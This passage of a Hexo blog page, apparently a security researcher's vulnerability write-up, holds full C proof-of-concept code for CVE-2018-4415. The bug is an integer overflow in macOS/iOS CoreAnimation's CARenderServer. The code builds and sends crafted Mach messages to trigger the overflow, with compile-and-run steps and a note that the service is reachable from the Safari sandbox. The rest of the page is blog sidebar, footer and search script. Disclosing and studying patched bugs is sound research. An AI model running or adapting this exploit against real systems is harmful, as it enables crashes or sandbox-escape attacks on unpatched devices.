class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Brief: Integer overflow in CoreAnimation, CVE-2018-4415</span></span><br><span class="line"><span class="comment"> *  Usage:</span></span><br><span class="line"><span class="comment"> *    1. clang FunctionIntOverFlow.c -o function_over_flow</span></span><br><span class="line"><span class="comment"> *    2. ./function_over_flow</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Specifically, `CA::Render::InterpolatedFunction::allocate_storage` function in QuartzCore does</span></span><br><span class="line"><span class="comment"> *  not do any check for integer overflow in expression |result = (char *)malloc(4 * (v4 + v3));|.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  The bug has been fixed in macOS 10.14.1 and iOS 12.1, since the interfaces and structure of</span></span><br><span class="line"><span class="comment"> *  messages are inconsistent between different versions, this PoC may only work on macOS 10.14 and</span></span><br><span class="line"><span class="comment"> *  iOS 12.0, but it's very easy to replant it to another versions.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Tips for debugging on macOS: Turn Mac to sleep mode and ssh to the target machine, this may</span></span><br><span class="line"><span class="comment"> *  help you concentrate on your work.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  One more: Mach service com.apple.CARenderServer is reacheable from Safari sandbox on both macOS</span></span><br><span class="line"><span class="comment"> *  and iOS. com.apple.windowserver.active accurately on macOS versions prior to macOS 10.14.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_int_overflow</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mach_port_t</span> p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;</span><br><span class="line">    task_get_bootstrap_port(mach_task_self(), &amp;bs_port);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *render_service_name = <span class="string">"com.apple.CARenderServer"</span>;</span><br><span class="line">    <span class="keyword">kern_return_t</span> (*bootstrap_look_up)(<span class="keyword">mach_port_t</span>, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mach_port_t</span> *) =</span><br><span class="line">        dlsym(RTLD_DEFAULT, <span class="string">"bootstrap_look_up"</span>);</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Cannot get service of %s, %s!\n"</span>, render_service_name, mach_error_string(kr));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">quartz_register_client_s</span> <span class="title">quartz_register_client_t</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">quartz_register_client_s</span> &#123;</span></span><br><span class="line">        <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">        <span class="keyword">uint32_t</span> body;</span><br><span class="line">        <span class="keyword">mach_msg_port_descriptor_t</span> ports[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">char</span> padding[<span class="number">12</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">quartz_register_client_t</span> msg_register;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_register, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_register));</span><br><span class="line">    msg_register.header.msgh_bits =</span><br><span class="line">        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |</span><br><span class="line">        MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">    msg_register.header.msgh_remote_port = p;</span><br><span class="line">    msg_register.header.msgh_local_port = mig_get_reply_port();</span><br><span class="line">    msg_register.header.msgh_id = <span class="number">40202</span>;  <span class="comment">// _XRegisterClient</span></span><br><span class="line"></span><br><span class="line">    msg_register.body = <span class="number">4</span>;</span><br><span class="line">    msg_register.ports[<span class="number">0</span>].name = mach_task_self();</span><br><span class="line">    msg_register.ports[<span class="number">0</span>].disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">    msg_register.ports[<span class="number">0</span>].type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line">    msg_register.ports[<span class="number">1</span>].name = mach_task_self();</span><br><span class="line">    msg_register.ports[<span class="number">1</span>].disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">    msg_register.ports[<span class="number">1</span>].type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line">    msg_register.ports[<span class="number">2</span>].name = mach_task_self();</span><br><span class="line">    msg_register.ports[<span class="number">2</span>].disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">    msg_register.ports[<span class="number">2</span>].type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line">    msg_register.ports[<span class="number">3</span>].name = mach_task_self();</span><br><span class="line">    msg_register.ports[<span class="number">3</span>].disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">    msg_register.ports[<span class="number">3</span>].type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">    kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,</span><br><span class="line">                  <span class="keyword">sizeof</span>(<span class="keyword">quartz_register_client_t</span>), <span class="keyword">sizeof</span>(<span class="keyword">quartz_register_client_t</span>),</span><br><span class="line">                  msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Send message failed: %s\n"</span>, mach_error_string(kr));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mach_port_t</span> context_port = *(<span class="keyword">uint32_t</span> *)((<span class="keyword">uint8_t</span> *)&amp;msg_register + <span class="number">0x1c</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> conn_id = *(<span class="keyword">uint32_t</span> *)((<span class="keyword">uint8_t</span> *)&amp;msg_register + <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">quartz_function_int_overflow_s</span> <span class="title">quartz_function_int_overflow_t</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">quartz_function_int_overflow_s</span> &#123;</span></span><br><span class="line">        <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">        <span class="keyword">char</span> msg_body[<span class="number">0x60</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">quartz_function_int_overflow_t</span> function_int_overflow_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    function_int_overflow_msg.header.msgh_bits =</span><br><span class="line">        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, <span class="number">0</span>) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">    function_int_overflow_msg.header.msgh_remote_port = context_port;</span><br><span class="line">    function_int_overflow_msg.header.msgh_id = <span class="number">40002</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(function_int_overflow_msg.msg_body, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(function_int_overflow_msg.msg_body));</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">0</span>) = <span class="number">0x1</span>;  <span class="comment">// Ports count</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *	1. One port consumes 12B space</span></span><br><span class="line"><span class="comment">     *	2. This `mach_msg` routine dose not need a port, so set this port to MACH_PORT_NULL(memory</span></span><br><span class="line"><span class="comment">     *	   cleared by memset)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">0</span>) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">4</span>) = conn_id;</span><br><span class="line">    *(<span class="keyword">int8_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span>) = <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">1</span>) = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">9</span>) = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint8_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">13</span>) = <span class="number">0x12</span>;  <span class="comment">// Decode Function</span></span><br><span class="line">    *(<span class="keyword">uint8_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">14</span>) = <span class="number">0x2</span>;</span><br><span class="line">    <span class="comment">/**(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0xDECAFBAD;*/</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">15</span>) = <span class="number">0x2000000000000000</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">23</span>) = <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">27</span>) = <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">31</span>) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    kr = mach_msg(&amp;function_int_overflow_msg.header, MACH_SEND_MSG,</span><br><span class="line">                  <span class="keyword">sizeof</span>(function_int_overflow_msg), <span class="number">0</span>, <span class="number">0</span>, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Send message failed: %s\n"</span>, mach_error_string(kr));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    do_int_overflow();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/blog/publi/tags/MacOS/" rel="tag"><i class="fa fa-tag"></i> MacOS</a>
          
            <a href="/blog/publi/tags/iOS/" rel="tag"><i class="fa fa-tag"></i> iOS</a>
          
            <a href="/blog/publi/tags/Safari/" rel="tag"><i class="fa fa-tag"></i> Safari</a>
          
            <a href="/blog/publi/tags/堆溢出/" rel="tag"><i class="fa fa-tag"></i> 堆溢出</a>
          
            <a href="/blog/publi/tags/沙箱逃逸/" rel="tag"><i class="fa fa-tag"></i> 沙箱逃逸</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/blog/publi/2018/11/28/以Ad-Hoc方式发布iOS应用" rel="next" title="以Ad-Hoc方式发布iOS应用">
                <i class="fa fa-chevron-left"></i> 以Ad-Hoc方式发布iOS应用
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/blog/publi/2019/04/22/第十二届全国大学生信息安全竞赛回顾" rel="prev" title="第十二届全国大学生信息安全竞赛回顾">
                第十二届全国大学生信息安全竞赛回顾 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  
    <div class="comments" id="comments">
      <div id="vcomments"></div>
    </div>
  


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/blog/publi/images/1.png"
                alt="Ainassine" />
            
              <p class="site-author-name" itemprop="name">Ainassine</p>
              <p class="site-description motion-element" itemprop="description">不做重复的事。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/blog/publi/archives/">
              
                  <span class="site-state-item-count">18</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/blog/publi/categories/index.html">
                  <span class="site-state-item-count">20</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/blog/publi/tags/index.html">
                  <span class="site-state-item-count">30</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/blog/publi/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/Joeeyy" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="mailto:joeeeee@foxmail.com" target="_blank" title="E-Mail">
                    
                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://exmaple.com" title="Test" target="_blank">Test</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞摘要"><span class="nav-number">1.</span> <span class="nav-text">漏洞摘要</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#厂商回应"><span class="nav-number">2.</span> <span class="nav-text">厂商回应</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE"><span class="nav-number">3.</span> <span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#致谢"><span class="nav-number">4.</span> <span class="nav-text">致谢</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#影响系统"><span class="nav-number">5.</span> <span class="nav-text">影响系统</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞细节"><span class="nav-number">6.</span> <span class="nav-text">漏洞细节</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#macOS-10-14"><span class="nav-number">6.1.</span> <span class="nav-text">macOS 10.14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iOS-12-10"><span class="nav-number">6.2.</span> <span class="nav-text">iOS 12.10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">6.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ainassine</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">20.0k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>



<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/blog/publi/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/blog/publi/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/blog/publi/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/blog/publi/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/blog/publi/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/blog/publi/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  






  
  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/valine@1.1.4/dist/Valine.min.js"></script>
  <script type="text/javascript">
    new Valine({
        av: AV,
        el: '#vcomments' ,
        verify: true,
        notify: true,
        app_id: 'RNU69dfOuHjI6UeBMUnrfc9r-gzGzoHsz',
        app_key: 'CjUKxBDwv46j3eAbL1XHPmh9',
        placeholder: '想说点什么？'
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/blog/publi/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
